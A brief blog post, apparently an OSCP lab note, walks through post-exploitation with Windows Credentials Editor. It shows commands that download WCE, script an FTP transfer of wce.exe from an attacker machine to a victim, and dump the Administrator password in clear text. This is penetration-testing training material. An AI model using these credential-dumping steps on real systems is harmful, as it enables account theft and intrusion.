---
published: true
layout: post
title: WCE post exploitation
---




Download wce

    cd /opt/
    wget http://www.ampliasecurity.com/research/wce_v1_41beta_universal.zip
    unzip wce_v1_41beta_universal.zip -d wce

**Victim**:  With ftp server running on attacking box.  Upload wce.exe to victim
    echo open 192.168.30.36> ftp.txt
    echo your_username>> ftp.txt
    echo your_password>> ftp.txt
    echo binary>> ftp.txt
    echo get wce.exe>> ftp.txt
    echo bye>> ftp.txt

**Victim**:  Execute wce.  Administrator password displayed in the clear.  (real password masked just in case any potential oscp students are actually reading this)

    C:\Documents and Settings\Administrator\My Documents>wce -w
    wce -w
    WCE v1.41beta (Windows Credentials Editor) - (c) 2010-2013 Amplia Security -     by Hernan Ochoa (hernan@ampliasecurity.com)
    Use -h for help.

    Administrator\RALPH:<password>
    RALPH$\THINC.LOCAL:
